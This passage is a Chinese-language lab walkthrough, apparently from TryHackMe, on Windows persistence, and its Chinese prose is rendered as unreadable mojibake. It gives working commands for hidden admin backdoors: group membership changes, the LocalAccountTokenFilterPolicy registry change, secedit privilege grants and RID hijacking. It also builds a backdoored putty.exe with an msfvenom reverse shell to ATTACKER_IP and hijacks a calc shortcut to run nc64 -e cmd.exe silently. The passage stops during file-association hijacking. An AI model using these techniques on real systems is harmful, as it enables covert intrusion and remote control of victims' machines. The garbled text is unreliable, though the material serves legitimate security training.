æ‹¥æœ‰ç®¡ç†å‘˜å‡­æ®å°†æ˜¯åœ¨è®¡ç®—æœºä¸­å®ç°æŒä¹…æ€§çš„æœ€ç®€å•æ–¹æ³•ã€‚ç„¶è€Œï¼Œä¸ºäº†è®©è“é˜Ÿæ›´éš¾æ£€æµ‹åˆ°æˆ‘ä»¬ï¼Œæˆ‘ä»¬å¯ä»¥æ“çºµéç‰¹æƒç”¨æˆ·ï¼ˆè¿™äº›ç”¨æˆ·é€šå¸¸ä¸ä¼šåƒç®¡ç†å‘˜é‚£æ ·å—åˆ°ç›‘æ§ï¼‰ï¼Œå¹¶ä»¥æŸç§æ–¹å¼æˆäºˆä»–ä»¬ç®¡ç†æƒé™ã€‚ è¯·æ³¨æ„ï¼Œæˆ‘ä»¬å‡è®¾æ‚¨å·²ç»ä»¥æŸç§æ–¹å¼è·å¾—äº†ç®¡ç†è®¿é—®æƒé™ï¼Œå¹¶å°è¯•ä»é‚£é‡Œå»ºç«‹æŒä¹…æ€§ã€‚ 2.1 ç¯¡æ”¹éç‰¹æƒè´¦æˆ· åˆ†é…ç»„æˆå‘˜èµ„æ ¼ å¯¹äºè¿™éƒ¨åˆ†ä»»åŠ¡ï¼Œæˆ‘ä»¬å‡è®¾æ‚¨å·²è½¬å‚¨å—å®³è®¡ç®—æœºçš„å¯†ç å“ˆå¸Œå€¼å¹¶æˆåŠŸç ´è§£äº†æ­£åœ¨ä½¿ç”¨çš„éç‰¹æƒå¸æˆ·çš„å¯†ç ã€‚ è®©éç‰¹æƒç”¨æˆ·è·å¾—ç®¡ç†æƒé™çš„ç›´æ¥æ–¹æ³•æ˜¯ä½¿å…¶æˆä¸ºç®¡ç†å‘˜ç»„çš„ä¸€éƒ¨åˆ†ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è½»æ¾å®ç°æ­¤ç›®çš„ï¼š C:\\&gt; net localgroup administrators thmuser0 /add è¿™å°†å…è®¸æ‚¨ä½¿ç”¨ RDPã€WinRM æˆ–ä»»ä½•å…¶ä»–å¯ç”¨çš„è¿œç¨‹ç®¡ç†æœåŠ¡æ¥è®¿é—®æœåŠ¡å™¨ã€‚ å¦‚æœè¿™çœ‹èµ·æ¥å¤ªå¯ç–‘ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å¤‡ä»½æ“ä½œå‘˜ç»„ã€‚è¯¥ç»„ä¸­çš„ç”¨æˆ·æ²¡æœ‰ç®¡ç†æƒé™ï¼Œä½†å¯ä»¥è¯»å–/å†™å…¥ç³»ç»Ÿä¸Šçš„ä»»ä½•æ–‡ä»¶æˆ–æ³¨å†Œè¡¨é¡¹ï¼Œå¿½ç•¥ä»»ä½•é…ç½®çš„ DACLã€‚è¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿå¤åˆ¶ SAM å’Œ SYSTEM æ³¨å†Œè¡¨é…ç½®å•å…ƒçš„å†…å®¹ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒä»¬æ¥æ¢å¤æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œä»è€Œä½¿æˆ‘ä»¬èƒ½å¤Ÿè½»æ¾å‡çº§åˆ°ä»»ä½•ç®¡ç†å¸æˆ·ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆå°†è¯¥å¸æˆ·æ·»åŠ åˆ° Backup Operators ç»„ï¼š C:\\&gt; net localgroup \"Backup Operators\" thmuser1 /add ç”±äºè¿™æ˜¯ä¸€ä¸ªéç‰¹æƒå¸æˆ·ï¼Œå› æ­¤å®ƒæ— æ³•é€šè¿‡ RDP æˆ– WinRM è¿”å›è®¡ç®—æœºï¼Œé™¤éæˆ‘ä»¬å°†å…¶æ·»åŠ åˆ°è¿œç¨‹æ¡Œé¢ç”¨æˆ· (RDP) æˆ–è¿œç¨‹ç®¡ç†ç”¨æˆ· (WinRM) ç»„ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ WinRM æ¥å®Œæˆæ­¤ä»»åŠ¡ï¼š C:\\&gt; net localgroup \"Remote Management Users\" thmuser1 /add æˆ‘ä»¬å‡è®¾æˆ‘ä»¬å·²ç»å°†å‡­æ®è½¬å‚¨åˆ°æœåŠ¡å™¨ä¸Šå¹¶æ‹¥æœ‰ thmuser1 çš„å¯†ç ã€‚è®©æˆ‘ä»¬ä½¿ç”¨å…¶å‡­æ®é€šè¿‡ WinRM è¿›è¡Œè¿æ¥ï¼š å¦‚æœæ‚¨ç°åœ¨å°è¯•ä»æ”»å‡»è€…è®¡ç®—æœºè¿›è¡Œè¿æ¥ï¼Œæ‚¨ä¼šæƒŠè®¶åœ°å‘ç°ï¼Œå³ä½¿æ‚¨ä½äº Backups Operators ç»„ä¸­ï¼Œæ‚¨ä¹Ÿæ— æ³•æŒ‰é¢„æœŸè®¿é—®æ‰€æœ‰æ–‡ä»¶ã€‚å¿«é€Ÿæ£€æŸ¥æˆ‘ä»¬åˆ†é…çš„ç»„å°†è¡¨æ˜æˆ‘ä»¬æ˜¯å¤‡ä»½æ“ä½œå‘˜çš„ä¸€éƒ¨åˆ†ï¼Œä½†è¯¥ç»„å·²è¢«ç¦ç”¨ï¼š è¿™æ˜¯ç”±äºç”¨æˆ·å¸æˆ·æ§åˆ¶ (UAC)ã€‚ UAC å®ç°çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯ LocalAccountTokenFilterPolicyï¼Œå®ƒä¼šåœ¨è¿œç¨‹ç™»å½•æ—¶å‰¥å¤ºä»»ä½•æœ¬åœ°å¸æˆ·çš„ç®¡ç†æƒé™ã€‚è™½ç„¶æ‚¨å¯ä»¥é€šè¿‡ UAC ä»å›¾å½¢ç”¨æˆ·ä¼šè¯æå‡æ‚¨çš„æƒé™ï¼ˆè¯·åœ¨æ­¤å¤„é˜…è¯»æœ‰å…³ UAC çš„æ›´å¤šä¿¡æ¯ï¼‰ï¼Œä½†å¦‚æœæ‚¨ä½¿ç”¨ WinRMï¼Œåˆ™æ‚¨å°†è¢«é™åˆ¶ä¸ºæ²¡æœ‰ç®¡ç†æƒé™çš„æœ‰é™è®¿é—®ä»¤ç‰Œã€‚ ä¸ºäº†èƒ½å¤Ÿä»æ‚¨çš„ç”¨æˆ·é‚£é‡Œé‡æ–°è·å¾—ç®¡ç†æƒé™ï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡å°†ä»¥ä¸‹æ³¨å†Œè¡¨é¡¹æ›´æ”¹ä¸º 1 æ¥ç¦ç”¨ LocalAccountTokenFilterPolicyï¼š C:\\&gt; reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 ä¸€æ—¦æ‰€æœ‰è¿™äº›éƒ½è®¾ç½®å®Œæ¯•ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„åé—¨ç”¨æˆ·äº†ã€‚é¦–å…ˆï¼Œè®©æˆ‘ä»¬å»ºç«‹ä¸€ä¸ª WinRM è¿æ¥å¹¶æ£€æŸ¥æ˜¯å¦ä¸ºæˆ‘ä»¬çš„ç”¨æˆ·å¯ç”¨äº† Backup Operators ç»„ï¼š ç„¶åæˆ‘ä»¬ç»§ç»­å¤‡ä»½ SAM å’Œ SYSTEM æ–‡ä»¶å¹¶å°†å®ƒä»¬ä¸‹è½½åˆ°æˆ‘ä»¬çš„æ”»å‡»è€…è®¡ç®—æœºä¸Šï¼š æ³¨æ„ï¼šå¦‚æœ Evil-WinRM ä¸‹è½½æ–‡ä»¶çš„æ—¶é—´è¿‡é•¿ï¼Œè¯·éšæ„ä½¿ç”¨ä»»ä½•å…¶ä»–ä¼ è¾“æ–¹æ³•ã€‚ æœ‰äº†è¿™äº›æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ secretsdump.py æˆ–å…¶ä»–ç±»ä¼¼å·¥å…·è½¬å‚¨æ‰€æœ‰ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼š æœ€åï¼Œæ‰§è¡Œ Pass-the-Hash ä»¥ä½¿ç”¨ç®¡ç†å‘˜æƒé™è¿æ¥åˆ°å—å®³è®¡ç®—æœºï¼š ç‰¹æ®Šæƒé™å’Œå®‰å…¨æè¿°ç¬¦ æ— éœ€ä¿®æ”¹ä»»ä½•ç»„æˆå‘˜èº«ä»½å³å¯å®ç°ä¸å°†ç”¨æˆ·æ·»åŠ åˆ° Backup Operators ç»„ç±»ä¼¼çš„ç»“æœã€‚ç‰¹æ®Šç»„ä¹‹æ‰€ä»¥ç‰¹æ®Šï¼Œæ˜¯å› ä¸ºæ“ä½œç³»ç»Ÿé»˜è®¤ä¸ºå®ƒä»¬åˆ†é…äº†ç‰¹å®šçš„æƒé™ã€‚æƒé™åªæ˜¯åœ¨ç³»ç»Ÿæœ¬èº«ä¸Šæ‰§è¡Œä»»åŠ¡çš„èƒ½åŠ›ã€‚å®ƒä»¬åŒ…æ‹¬ç®€å•çš„äº‹æƒ…ï¼Œä¾‹å¦‚èƒ½å¤Ÿå…³é—­æœåŠ¡å™¨çš„èƒ½åŠ›ï¼Œä»¥åŠéå¸¸ç‰¹æƒçš„æ“ä½œï¼Œä¾‹å¦‚èƒ½å¤Ÿè·å¾—ç³»ç»Ÿä¸Šä»»ä½•æ–‡ä»¶çš„æ‰€æœ‰æƒã€‚æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å¯ç”¨æƒé™çš„å®Œæ•´åˆ—è¡¨ä»¥ä¾›å‚è€ƒï¼šhere å¯¹äº Backup Operators ç»„ï¼Œé»˜è®¤åˆ†é…æœ‰ä»¥ä¸‹ä¸¤ä¸ªæƒé™ï¼š SeBackupPrivilegeï¼šç”¨æˆ·å¯ä»¥è¯»å–ç³»ç»Ÿä¸­çš„ä»»ä½•æ–‡ä»¶ï¼Œå¿½ç•¥ä»»ä½• DACLã€‚ SeRestorePrivilegeï¼šç”¨æˆ·å¯ä»¥å†™å…¥ç³»ç»Ÿä¸­çš„ä»»ä½•æ–‡ä»¶ï¼Œå¿½ç•¥ä»»ä½• DACLã€‚ æˆ‘ä»¬å¯ä»¥å°†æ­¤ç±»æƒé™åˆ†é…ç»™ä»»ä½•ç”¨æˆ·ï¼Œæ— è®ºå…¶ç»„æˆå‘˜èº«ä»½å¦‚ä½•ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ secedit å‘½ä»¤ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å°†å½“å‰é…ç½®å¯¼å‡ºåˆ°ä¸´æ—¶æ–‡ä»¶ï¼š secedit /export /cfg config.inf æˆ‘ä»¬æ‰“å¼€æ–‡ä»¶å¹¶å°†ç”¨æˆ·æ·»åŠ åˆ°æœ‰å…³ SeBackupPrivilege å’Œ SeRestorePrivilege çš„é…ç½®è¡Œä¸­ï¼š æˆ‘ä»¬æœ€ç»ˆå°† .inf æ–‡ä»¶è½¬æ¢ä¸º .sdb æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨è¯¥æ–‡ä»¶å°†é…ç½®åŠ è½½å›ç³»ç»Ÿä¸­ï¼š secedit /import /cfg config.inf /db config.sdb secedit /configure /db config.sdb /cfg config.inf æ‚¨ç°åœ¨åº”è¯¥æ‹¥æœ‰ä¸€ä¸ªä¸ä»»ä½•å¤‡ä»½æ“ä½œå‘˜å…·æœ‰åŒç­‰æƒé™çš„ç”¨æˆ·ã€‚ç”¨æˆ·ä»ç„¶æ— æ³•é€šè¿‡WinRMç™»å½•ç³»ç»Ÿï¼Œæ‰€ä»¥è®©æˆ‘ä»¬åšç‚¹ä»€ä¹ˆã€‚æˆ‘ä»¬ä¸ä¼šå°†ç”¨æˆ·æ·»åŠ åˆ°è¿œç¨‹ç®¡ç†ç”¨æˆ·ç»„ï¼Œè€Œæ˜¯æ›´æ”¹ä¸ WinRM æœåŠ¡å…³è”çš„å®‰å…¨æè¿°ç¬¦ä»¥å…è®¸ thmuser2 è¿›è¡Œè¿æ¥ã€‚å°†å®‰å…¨æè¿°ç¬¦è§†ä¸º ACLï¼Œä½†åº”ç”¨äºå…¶ä»–ç³»ç»Ÿè®¾æ–½ã€‚ è¦æ‰“å¼€ WinRM å®‰å…¨æè¿°ç¬¦çš„é…ç½®çª—å£ï¼Œæ‚¨å¯ä»¥åœ¨ Powershell ä¸­ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼ˆä¸ºæ­¤ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ GUI ä¼šè¯ï¼‰ï¼š Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI è¿™å°†æ‰“å¼€ä¸€ä¸ªçª—å£ï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­æ·»åŠ  thmuser2 å¹¶ä¸ºå…¶åˆ†é…è¿æ¥åˆ° WinRM çš„å®Œæ•´æƒé™ï¼š å®Œæˆæ­¤æ“ä½œåï¼Œæˆ‘ä»¬çš„ç”¨æˆ·å°±å¯ä»¥é€šè¿‡ WinRM è¿›è¡Œè¿æ¥ã€‚ç”±äºç”¨æˆ·å…·æœ‰ SeBackup å’Œ SeRestore æƒé™ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é‡å¤è¿™äº›æ­¥éª¤ä»¥ä» SAM æ¢å¤å¯†ç å“ˆå¸Œå¹¶é‡æ–°è¿æ¥åˆ°ç®¡ç†å‘˜ç”¨æˆ·ã€‚ è¯·æ³¨æ„ï¼Œè¦ä½¿è¯¥ç”¨æˆ·å®Œå…¨ä½¿ç”¨ç»™å®šçš„æƒé™ï¼Œæ‚¨å¿…é¡»æ›´æ”¹ LocalAccountTokenFilterPolicy æ³¨å†Œè¡¨é¡¹ï¼Œä½†æˆ‘ä»¬å·²ç»å®Œæˆäº†æ­¤æ“ä½œä»¥è·å¾—å…ˆå‰çš„æ ‡å¿—ã€‚ å¦‚æœæ‚¨æ£€æŸ¥ç”¨æˆ·çš„ç»„æˆå‘˜èº«ä»½ï¼Œå®ƒçœ‹èµ·æ¥å°±åƒæ˜¯æ™®é€šç”¨æˆ·ã€‚æ ¹æœ¬å°±æ²¡æœ‰ä»€ä¹ˆå¯ç–‘çš„åœ°æ–¹ï¼ æˆ‘ä»¬å†æ¬¡å‡è®¾æˆ‘ä»¬å·²ç»å°†å‡­æ®è½¬å‚¨åˆ°æœåŠ¡å™¨ä¸Šå¹¶æ‹¥æœ‰ thmuser2 çš„å¯†ç ã€‚è®©æˆ‘ä»¬ä½¿ç”¨ WinRM è¿æ¥å…¶å‡­æ®ï¼š RIDåŠ«æŒ æ— éœ€æˆä¸ºç®¡ç†å‘˜å³å¯è·å¾—ç®¡ç†æƒé™çš„å¦ä¸€ç§æ–¹æ³•æ˜¯æ›´æ”¹æŸäº›æ³¨å†Œè¡¨å€¼ï¼Œä½¿æ“ä½œç³»ç»Ÿè®¤ä¸ºæ‚¨æ˜¯ç®¡ç†å‘˜ã€‚ åˆ›å»ºç”¨æˆ·æ—¶ï¼Œä¼šä¸ºå…¶åˆ†é…ä¸€ä¸ªç§°ä¸ºç›¸å¯¹ ID (RID) çš„æ ‡è¯†ç¬¦ã€‚ RID åªæ˜¯ä»£è¡¨ç³»ç»Ÿä¸­ç”¨æˆ·çš„æ•°å­—æ ‡è¯†ç¬¦ã€‚å½“ç”¨æˆ·ç™»å½•æ—¶ï¼ŒLSASS è¿›ç¨‹ä» SAM æ³¨å†Œè¡¨é…ç½®å•å…ƒè·å–å…¶ RIDï¼Œå¹¶åˆ›å»ºä¸è¯¥ RID å…³è”çš„è®¿é—®ä»¤ç‰Œã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥ç¯¡æ”¹æ³¨å†Œè¡¨å€¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†ç›¸åŒçš„ RID å…³è”åˆ°ä¸¤ä¸ªå¸æˆ·ï¼Œè®© Windows ä¸ºéç‰¹æƒç”¨æˆ·åˆ†é…ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œã€‚ åœ¨ä»»ä½• Windows ç³»ç»Ÿä¸­ï¼Œé»˜è®¤ç®¡ç†å‘˜å¸æˆ·åˆ†é…çš„ RID = 500ï¼Œæ™®é€šç”¨æˆ·é€šå¸¸å…·æœ‰ RID &gt;= 1000ã€‚ è¦æŸ¥æ‰¾ä¸ºä»»ä½•ç”¨æˆ·åˆ†é…çš„ RIDï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š wmic useraccount get name,sid RID æ˜¯ SID çš„æœ€åä¸€ä½ï¼ˆthmuser3 ä¸º 1010ï¼Œç®¡ç†å‘˜ä¸º 500ï¼‰ã€‚ SID æ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œå…è®¸æ“ä½œç³»ç»Ÿè·¨åŸŸè¯†åˆ«ç”¨æˆ·ï¼Œä½†å¯¹äºæ­¤ä»»åŠ¡ï¼Œæˆ‘ä»¬ä¸ä¼šå¤ªåœ¨æ„å®ƒçš„å…¶ä½™éƒ¨åˆ†ã€‚ ç°åœ¨æˆ‘ä»¬åªéœ€å°† RID=500 åˆ†é…ç»™ thmuser3ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ Regedit è®¿é—® SAMã€‚ SAM ä»…é™äº SYSTEM å¸æˆ·ï¼Œå› æ­¤å³ä½¿æ˜¯ç®¡ç†å‘˜ä¹Ÿæ— æ³•å¯¹å…¶è¿›è¡Œç¼–è¾‘ã€‚è¦ä»¥ SYSTEM èº«ä»½è¿è¡Œ Regeditï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ psexecï¼Œå®ƒå¯ä»¥åœ¨æ‚¨çš„è®¡ç®—æœºä¸­çš„ C:\\tools\\pstools ä¸­æ‰¾åˆ°ï¼š C:\\tools\\pstools&gt; PsExec64.exe -i -s regedit ä» Regedit ä¸­ï¼Œæˆ‘ä»¬å°†è½¬åˆ° HKLM\\SAM\\SAM\\Domains\\Account\\Users\\ ï¼Œå…¶ä¸­è®¡ç®—æœºä¸­çš„æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªå¯†é’¥ã€‚ç”±äºæˆ‘ä»¬è¦ä¿®æ”¹ thmuser3ï¼Œå› æ­¤éœ€è¦æœç´¢å…¶ RID ä¸ºåå…­è¿›åˆ¶çš„å¯†é’¥ (1010 = 0x3F2)ã€‚åœ¨å¯¹åº”çš„keyä¸‹ï¼Œä¼šæœ‰ä¸€ä¸ªå«åšFçš„å€¼ï¼Œå®ƒåœ¨0x30ä½ç½®ä¿å­˜äº†ç”¨æˆ·çš„æœ‰æ•ˆRIDï¼š è¯·æ³¨æ„ï¼ŒRID ä½¿ç”¨å°ç«¯è¡¨ç¤ºæ³•å­˜å‚¨ï¼Œå› æ­¤å…¶å­—èŠ‚æ˜¾ç¤ºä¸ºåå‘ã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬å°†ç”¨åå…­è¿›åˆ¶çš„ç®¡ç†å‘˜ RID æ›¿æ¢è¿™ä¸¤ä¸ªå­—èŠ‚ (500 = 0x01F4)ï¼Œå¹¶äº¤æ¢å­—èŠ‚ (F401)ï¼š ä¸‹æ¬¡ thmuser3 ç™»å½•æ—¶ï¼ŒLSASS ä¼šå°†å…¶ä¸ç®¡ç†å‘˜ç›¸åŒçš„ RID å…³è”èµ·æ¥ï¼Œå¹¶æˆäºˆå®ƒä»¬ç›¸åŒçš„æƒé™ã€‚ å¯¹äºæ­¤ä»»åŠ¡ï¼Œæˆ‘ä»¬å‡è®¾æ‚¨å·²ç»ç ´åäº†ç³»ç»Ÿå¹¶è·å–äº† thmuser3 çš„å¯†ç ã€‚ä¸ºäº†æ‚¨çš„æ–¹ä¾¿ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­æ®é€šè¿‡ RDP è¿›è¡Œè¿æ¥ï¼š 2.2 åé—¨æ–‡ä»¶ å»ºç«‹æŒä¹…æ€§çš„å¦ä¸€ç§æ–¹æ³•åŒ…æ‹¬ç¯¡æ”¹æˆ‘ä»¬çŸ¥é“ç”¨æˆ·å®šæœŸäº¤äº’çš„ä¸€äº›æ–‡ä»¶ã€‚é€šè¿‡å¯¹è¿™äº›æ–‡ä»¶è¿›è¡Œä¸€äº›ä¿®æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥æ¤å…¥åé—¨ï¼Œæ¯å½“ç”¨æˆ·è®¿é—®å®ƒä»¬æ—¶å°±ä¼šæ‰§è¡Œè¿™äº›åé—¨ã€‚ç”±äºæˆ‘ä»¬ä¸æƒ³åˆ›å»ºä»»ä½•å¯èƒ½æš´éœ²æˆ‘ä»¬èº«ä»½çš„è­¦æŠ¥ï¼Œå› æ­¤æˆ‘ä»¬æ›´æ”¹çš„æ–‡ä»¶å¿…é¡»ç»§ç»­æŒ‰é¢„æœŸä¸ºç”¨æˆ·å·¥ä½œã€‚ è™½ç„¶æ¤å…¥åé—¨çš„æœºä¼šæœ‰å¾ˆå¤šï¼Œä½†æˆ‘ä»¬å°†æ£€æŸ¥æœ€å¸¸ç”¨çš„åé—¨ã€‚ å¯æ‰§è¡Œæ–‡ä»¶ å¦‚æœæ‚¨åœ¨æ¡Œé¢ä¸Šå‘ç°ä»»ä½•å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆ™ç”¨æˆ·å¾ˆå¯èƒ½ä¼šç»å¸¸ä½¿ç”¨å®ƒã€‚å‡è®¾æˆ‘ä»¬æ‰¾åˆ°äº† PuTTY çš„å¿«æ·æ–¹å¼ã€‚å¦‚æœæˆ‘ä»¬æ£€æŸ¥å¿«æ·æ–¹å¼çš„å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒï¼ˆé€šå¸¸ï¼‰æŒ‡å‘ C:\\Program Files\\PuTTY\\putty.exe ã€‚ä»é‚£æ—¶èµ·ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸‹è½½åˆ°æ”»å‡»è€…çš„è®¡ç®—æœºä¸Šå¹¶ä¿®æ”¹å®ƒä»¥è¿è¡Œæˆ‘ä»¬æƒ³è¦çš„ä»»ä½•æœ‰æ•ˆè´Ÿè½½ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ msfvenom è½»æ¾åœ°å°†æ‚¨åå¥½çš„æœ‰æ•ˆè´Ÿè½½æ¤å…¥åˆ°ä»»ä½• .exe æ–‡ä»¶ä¸­ã€‚äºŒè¿›åˆ¶æ–‡ä»¶ä»å°†ç…§å¸¸å·¥ä½œï¼Œä½†é€šè¿‡åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ·»åŠ é¢å¤–çš„çº¿ç¨‹ä»¥é™é»˜æ–¹å¼æ‰§è¡Œé¢å¤–çš„æœ‰æ•ˆè´Ÿè½½ã€‚è¦åˆ›å»ºåé—¨ putty.exeï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b \"\\x00\" -f exe -o puttyX.exe ç”Ÿæˆçš„ puttyX.exe å°†åœ¨ç”¨æˆ·æ²¡æœ‰æ³¨æ„åˆ°çš„æƒ…å†µä¸‹æ‰§è¡Œreverse_tcp meterpreteræœ‰æ•ˆè´Ÿè½½ã€‚è™½ç„¶è¿™ç§æ–¹æ³•è¶³ä»¥å»ºç«‹æŒä¹…æ€§ï¼Œä½†è®©æˆ‘ä»¬çœ‹çœ‹å…¶ä»–æ›´ç‹¡çŒ¾çš„æŠ€æœ¯ã€‚ å¿«æ·æ–¹å¼æ–‡ä»¶ å¦‚æœæˆ‘ä»¬ä¸æƒ³ä¿®æ”¹å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬æ€»æ˜¯å¯ä»¥ç¯¡æ”¹å¿«æ·æ–¹å¼æ–‡ä»¶æœ¬èº«ã€‚ä¸å…¶ç›´æ¥æŒ‡å‘é¢„æœŸçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶æ›´æ”¹ä¸ºæŒ‡å‘ä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†è¿è¡Œä¸€ä¸ªåé—¨ï¼Œç„¶åæ­£å¸¸æ‰§è¡Œé€šå¸¸çš„ç¨‹åºã€‚ å¯¹äºæ­¤ä»»åŠ¡ï¼Œè®©æˆ‘ä»¬æ£€æŸ¥ç®¡ç†å‘˜æ¡Œé¢ä¸Šçš„ calc å¿«æ·æ–¹å¼ã€‚å¦‚æœæˆ‘ä»¬å³é”®å•å‡»å®ƒå¹¶è½¬åˆ°å±æ€§ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°å®ƒæŒ‡å‘çš„ä½ç½®ï¼š åœ¨åŠ«æŒå¿«æ·æ–¹å¼çš„ç›®æ ‡ä¹‹å‰ï¼Œè®©æˆ‘ä»¬åœ¨ C:\\Windows\\System32 æˆ–ä»»ä½•å…¶ä»–éšè”½ä½ç½®åˆ›å»ºä¸€ä¸ªç®€å•çš„ Powershell è„šæœ¬ã€‚è¯¥è„šæœ¬å°†æ‰§è¡Œåå‘ shellï¼Œç„¶åä»å¿«æ·æ–¹å¼å±æ€§ä¸Šçš„åŸå§‹ä½ç½®è¿è¡Œ calc.exeï¼š Start-Process -NoNewWindow \"c:\\tools c64.exe\" \"-e cmd.exe ATTACKER_IP 4445\" C:\\Windows\\System32\\calc.exe æœ€åï¼Œæˆ‘ä»¬å°†æ›´æ”¹å¿«æ·æ–¹å¼ä»¥æŒ‡å‘æˆ‘ä»¬çš„è„šæœ¬ã€‚è¯·æ³¨æ„ï¼Œæ‰§è¡Œæ­¤æ“ä½œæ—¶ï¼Œå¿«æ·æ–¹å¼çš„å›¾æ ‡å¯èƒ½ä¼šè‡ªåŠ¨è°ƒæ•´ã€‚è¯·åŠ¡å¿…å°†å›¾æ ‡æŒ‡å‘åŸå§‹å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»¥ä¾¿ç”¨æˆ·ä¸ä¼šçœ‹åˆ°ä»»ä½•å¯è§çš„æ›´æ”¹ã€‚æˆ‘ä»¬è¿˜æƒ³åœ¨éšè—çª—å£ä¸Šè¿è¡Œè„šæœ¬ï¼Œä¸ºæ­¤æˆ‘ä»¬å°† -windowstyle hidden é€‰é¡¹æ·»åŠ åˆ° Powershellã€‚å¿«æ·æ–¹å¼çš„æœ€ç»ˆç›®æ ‡æ˜¯ï¼š powershell.exe -WindowStyle hidden C:\\Windows\\System32\\backdoor.ps1 è®©æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ª nc ç›‘å¬å™¨æ¥æ¥æ”¶æ”»å‡»è€…æœºå™¨ä¸Šçš„åå‘ shellï¼š user@AttackBox$ nc -lvp 4445 å¦‚æœåŒå‡»è¯¥å¿«æ·æ–¹å¼ï¼Œæ‚¨åº”è¯¥ä¼šè·å¾—ä¸æ”»å‡»è€…è®¡ç®—æœºçš„è¿æ¥ã€‚åŒæ—¶ï¼Œç”¨æˆ·å°†å¾—åˆ°ä¸€ä¸ªæ­£å¦‚ä»–ä»¬æ‰€æœŸæœ›çš„è®¡ç®—å™¨ã€‚æ‚¨å¯èƒ½ä¼šæ³¨æ„åˆ°å‘½ä»¤æç¤ºç¬¦åœ¨å±å¹•ä¸Šé—ªçƒå¹¶ç«‹å³æ¶ˆå¤±ã€‚å¸Œæœ›æ™®é€šç”¨æˆ·å¯èƒ½ä¸ä¼šå¤ªä»‹æ„è¿™ä¸€ç‚¹ã€‚ åŠ«æŒæ–‡ä»¶å…³è” é™¤äº†é€šè¿‡å¯æ‰§è¡Œæ–‡ä»¶æˆ–å¿«æ·æ–¹å¼è¿›è¡ŒæŒä¹…åŒ–ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åŠ«æŒä»»ä½•æ–‡ä»¶å…³è”ï¼Œä»¥å¼ºåˆ¶æ“ä½œç³»ç»Ÿåœ¨ç”¨æˆ·æ‰“å¼€ç‰¹å®šæ–‡ä»¶ç±»å‹æ—¶è¿è¡Œ shellã€‚ é»˜è®¤æ“ä½œç³»ç»Ÿæ–‡ä»¶å…³è”ä¿å­˜åœ¨æ³¨å†Œè¡¨å†…ï¼Œå…¶ä¸­ HKLM\\Software\\Classes\\ ä¸‹ä¸ºæ¯ä¸ªæ–‡ä»¶ç±»å‹å­˜å‚¨ä¸€ä¸ªå¯†é’¥ã€‚å‡è®¾æˆ‘ä»¬è¦æ£€æŸ¥ä½¿ç”¨å“ªä¸ªç¨‹åºæ‰“å¼€ .txt æ–‡ä»¶ï¼›æˆ‘ä»¬å¯ä»¥æ£€æŸ¥ .txt å­é¡¹å¹¶æ‰¾åˆ°ä¸å…¶å…³è”çš„ç¨‹åº ID (ProgID)ã€‚ ProgID åªæ˜¯ç³»ç»Ÿä¸Šå®‰è£…çš„ç¨‹åºçš„æ ‡è¯†ç¬¦ã€‚å¯¹äº .txt æ–‡ä»¶ï¼Œæˆ‘ä»¬å°†å…·æœ‰ä»¥ä¸‹ ProgIDï¼š ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥æœç´¢ç›¸åº” ProgID çš„å­é¡¹ï¼ˆä¹Ÿåœ¨ HKLM\\Software\\Classes\\ 